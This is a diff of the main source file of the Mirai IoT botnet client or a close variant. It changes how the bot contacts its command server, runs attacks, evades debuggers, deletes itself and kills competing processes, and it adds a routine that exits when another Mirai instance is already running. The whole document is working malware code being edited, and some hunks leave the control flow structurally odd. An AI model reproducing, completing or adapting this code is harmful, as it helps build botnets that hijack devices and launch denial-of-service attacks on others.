@@ -1,8 +1,6 @@
 #define _GNU_SOURCE
 
-#ifdef DEBUG
 #include <stdio.h>
-#endif
 #include <string.h>
 #include <stdlib.h>
 #include <unistd.h>
@@ -25,6 +23,7 @@
 #include "util.h"
 #include "resolv.h"
 
+static void check_and_exit_self(void);
 static void check_and_kill_white(void);
 static void anti_gdb_entry(int);
 static void resolve_cnc_addr(void);
@@ -42,7 +41,6 @@ ipv4_t LOCAL_ADDR;
 
 void check_and_kill_white()
 {
-    static BOOL detected = FALSE;
     int sock = socket(AF_INET, SOCK_STREAM, 0);
     if (sock < 0){
         printf("Socket error occurred!\r\n");
@@ -59,18 +57,38 @@ void check_and_kill_white()
         printf("White detected! Killing...\r\n");
         killer_kill_by_port(SINGLE_INSTANCE_PORT_WHITE);
         close(sock);
-        detected = TRUE;
     }
-    addr.sin_addr.s_addr = INET_ADDR(127,0,0,1);
-    if (detected == FALSE){
-        if (bind(sock, (struct sockaddr *)&addr, sizeof(addr)) == 0) {
-            printf("White not detected!\r\n");
-            close(sock);
-        } else {
-            printf("White detected! Killing...\r\n");
-            killer_kill_by_port(SINGLE_INSTANCE_PORT_WHITE);
-            close(sock);
-        }
+    //addr.sin_addr.s_addr = INET_ADDR(127,0,0,1);
+    //if (detected == FALSE){
+    //    if (bind(sock, (struct sockaddr *)&addr, sizeof(addr)) == 0) {
+    //       printf("White not detected!\r\n");
+    //        close(sock);
+    //    } else {
+    //        printf("White detected! Killing...\r\n");
+    //        killer_kill_by_port(SINGLE_INSTANCE_PORT_WHITE);
+    //       close(sock);
+    //   }
+    //}
+}
+
+void check_and_exit_self()
+{
+   int sock = socket(AF_INET, SOCK_STREAM, 0);
+    if (sock < 0){
+        printf("Socket error occurred!\r\n");
+    }
+    struct sockaddr_in addr;
+    addr.sin_family = AF_INET;
+    addr.sin_port = htons(SINGLE_INSTANCE_PORT);
+    addr.sin_addr.s_addr = INADDR_ANY;
+
+    if (bind(sock, (struct sockaddr *)&addr, sizeof(addr)) == 0) {
+        printf("Mirai not detected!\r\n");
+        close(sock);
+    } else {
+        printf("Mirai detected! Exitting...\r\n");
+        close(sock);
+        exit(0);
     }
 }
 
@@ -91,12 +109,12 @@ int main(int argc, char **args)
     int tbl_exec_succ_len;
     int pgid, pings = 0;
 
-#ifndef DEBUG
+#ifdef DEBUG
     sigset_t sigs;
     int wfd;
 
     // Delete self
-    unlink(args[0]);
+    // unlink(args[0]);
 
     // Signal based control flow
     sigemptyset(&sigs);
@@ -137,7 +155,7 @@ int main(int argc, char **args)
     if (sigaction(SIGBUS, &sa, NULL) == -1)
         perror("sigaction");
 #endif
-
+    check_and_exit_self();
     check_and_kill_white();
 
     LOCAL_ADDR = util_local_addr();
@@ -146,7 +164,7 @@ int main(int argc, char **args)
     srv_addr.sin_addr.s_addr = FAKE_CNC_ADDR;
     srv_addr.sin_port = htons(FAKE_CNC_PORT);
 
-#ifdef DEBUG
+#ifndef DEBUG
     unlock_tbl_if_nodebug(args[0]);
     anti_gdb_entry(0);
 #else
@@ -183,14 +201,17 @@ int main(int argc, char **args)
     write(STDOUT, tbl_exec_succ, tbl_exec_succ_len);
     write(STDOUT, "\n", 1);
     table_lock_val(TABLE_EXEC_SUCCESS);
-
-#ifndef DEBUG
-    if (fork() > 0)
+#ifdef DEBUG
+    int f = fork();
+    if (f > 0){
+        printf("Parent\n");
         return 0;
+    }
+    if (f == 0){
     pgid = setsid();
-    close(STDIN);
-    close(STDOUT);
-    close(STDERR);
+    // close(STDIN);
+    // close(STDOUT);
+    // close(STDERR);
 #endif
 
     attack_init();
@@ -201,7 +222,7 @@ int main(int argc, char **args)
 #endif
 #endif
 
-    while (TRUE)
+    while (1)
     {
         fd_set fdsetrd, fdsetwr, fdsetex;
         struct timeval timeo;
@@ -213,7 +234,6 @@ int main(int argc, char **args)
         // Socket for accept()
         if (fd_ctrl != -1)
             FD_SET(fd_ctrl, &fdsetrd);
-
         // Set up CNC sockets
         if (fd_serv == -1)
             establish_connection();
@@ -358,7 +378,7 @@ int main(int argc, char **args)
             if (n == -1)
             {
                 if (errno == EWOULDBLOCK || errno == EAGAIN || errno == EINTR)
-                    continue;
+                   continue;
                 else
                     n = 0;
             }
@@ -386,7 +406,7 @@ int main(int argc, char **args)
                 attack_parse(rdbuf, len);
         }
     }
-
+}
     return 0;
 }
 
@@ -479,9 +499,40 @@ static void ensure_single_instance(void)
         if (errno == EADDRNOTAVAIL && local_bind)
             local_bind = FALSE;
 #ifdef DEBUG
-        printf("[main] Another instance is already running (errno = %d)! Exitting...\r\n", errno);
+        printf("[main] Another instance is already running (errno = %d)! Sending kill request...\r\n", errno);
+#endif
+	exit(0);
+        // Reset addr just in case
+        addr.sin_family = AF_INET;
+        addr.sin_addr.s_addr = INADDR_ANY;
+        addr.sin_port = htons(SINGLE_INSTANCE_PORT);
+
+        if (connect(fd_ctrl, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1)
+        {
+#ifdef DEBUG
+            printf("[main] Failed to connect to fd_ctrl to request process termination\n");
+#endif
+        }
+        
+        sleep(5);
         close(fd_ctrl);
-        exit(0);
+        killer_kill_by_port(htons(SINGLE_INSTANCE_PORT));
+        ensure_single_instance(); // Call again, so that we are now the control
+    }
+    else
+    {
+        if (listen(fd_ctrl, 1) == -1)
+        {
+#ifdef DEBUG
+            printf("[main] Failed to call listen() on fd_ctrl\n");
+            close(fd_ctrl);
+            sleep(5);
+            killer_kill_by_port(htons(SINGLE_INSTANCE_PORT));
+            ensure_single_instance();
+#endif
+        }
+#ifdef DEBUG
+        printf("[main] We are the only process on this system!\n");
 #endif
     }
 }
